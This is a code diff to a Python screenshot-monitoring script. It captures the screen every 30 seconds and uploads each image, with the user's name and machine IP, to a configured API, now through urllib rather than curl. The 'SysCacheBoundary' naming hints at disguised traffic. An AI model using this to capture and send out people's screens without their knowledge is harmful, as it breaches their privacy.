@@ -3,11 +3,12 @@ import time
 import datetime
 import sys
 import logging
-import subprocess
 import socket
 import uuid
 import getpass
 import pyautogui
+import urllib.error
+import urllib.request
 from dotenv import load_dotenv
 
 # Get the directory where the script is located
@@ -51,6 +52,8 @@ INTERVAL = 30
 RETENTION_DAYS = 3
 UPLOAD_API_URL = os.getenv("API_URL", "").strip() + "/image"
 UPLOAD_API_TOKEN = os.getenv("API_KEY", "").strip()
+UPLOAD_RETRY_DELAY_SECONDS = 300
+_upload_disabled_until = 0.0
 
 
 def create_dirs():
@@ -137,46 +140,73 @@ def get_user_identifier():
 
 
 def send_screenshot_to_api(filepath):
+    global _upload_disabled_until
+
     if not UPLOAD_API_URL:
+        return
+
+    if time.time() < _upload_disabled_until:
         return
 
     client_ip = get_machine_ip()
     username = get_user_identifier()
-
-    cmd = [
-        "curl",
-        "-sS",
-        "-X",
-        "POST",
-        UPLOAD_API_URL,
-        "-F",
-        f"file=@{filepath}",
-        "-F",
-        f"client_ip={client_ip}",
-        "-F",
-        f"username={username}",
-    ]
-
+    headers = {}
     if UPLOAD_API_TOKEN:
-        cmd.extend(["-H", f"Authorization: Bearer {UPLOAD_API_TOKEN}"])
+        headers["Authorization"] = f"Bearer {UPLOAD_API_TOKEN}"
 
     try:
-        result = subprocess.run(
-            cmd,
-            capture_output=True,
-            text=True,
-            check=False,
+        boundary = f"----SysCacheBoundary{uuid.uuid4().hex}"
+        with open(filepath, "rb") as image_file:
+            file_content = image_file.read()
+
+        body = bytearray()
+        for key, value in (("client_ip", client_ip), ("username", username)):
+            body.extend(f"--{boundary}\r\n".encode("utf-8"))
+            body.extend(f'Content-Disposition: form-data; name="{key}"\r\n\r\n'.encode("utf-8"))
+            body.extend(f"{value}\r\n".encode("utf-8"))
+
+        body.extend(f"--{boundary}\r\n".encode("utf-8"))
+        body.extend(
+            f'Content-Disposition: form-data; name="file"; filename="{os.path.basename(filepath)}"\r\n'.encode("utf-8")
         )
-        if result.returncode == 0:
+        body.extend(b"Content-Type: image/png\r\n\r\n")
+        body.extend(file_content)
+        body.extend(b"\r\n")
+        body.extend(f"--{boundary}--\r\n".encode("utf-8"))
+
+        request_headers = {
+            "Content-Type": f"multipart/form-data; boundary={boundary}",
+            **headers,
+        }
+        request = urllib.request.Request(
+            UPLOAD_API_URL,
+            data=bytes(body),
+            headers=request_headers,
+            method="POST",
+        )
+
+        with urllib.request.urlopen(request, timeout=60) as response:
+            status_code = response.getcode()
+            response_text = response.read().decode("utf-8", errors="replace")
+
+        if 200 <= status_code < 300:
             logging.info("Upload enviado com sucesso para API.")
-        else:
-            logging.error(
-                "Falha no upload (%s): %s",
-                result.returncode,
-                (result.stderr or result.stdout).strip(),
-            )
+            return
+
+        logging.error(
+            "Falha no upload (%s): %s",
+            status_code,
+            response_text.strip(),
+        )
+    except (urllib.error.URLError, TimeoutError) as e:
+        _upload_disabled_until = time.time() + UPLOAD_RETRY_DELAY_SECONDS
+        logging.warning(
+            "Upload indisponível no momento (%s). Nova tentativa em %ss.",
+            e,
+            UPLOAD_RETRY_DELAY_SECONDS,
+        )
     except Exception as e:
-        logging.exception("Erro ao executar curl para upload: %s", e)
+        logging.exception("Erro inesperado ao enviar upload: %s", e)
 
 
 def cleanup_old_files():
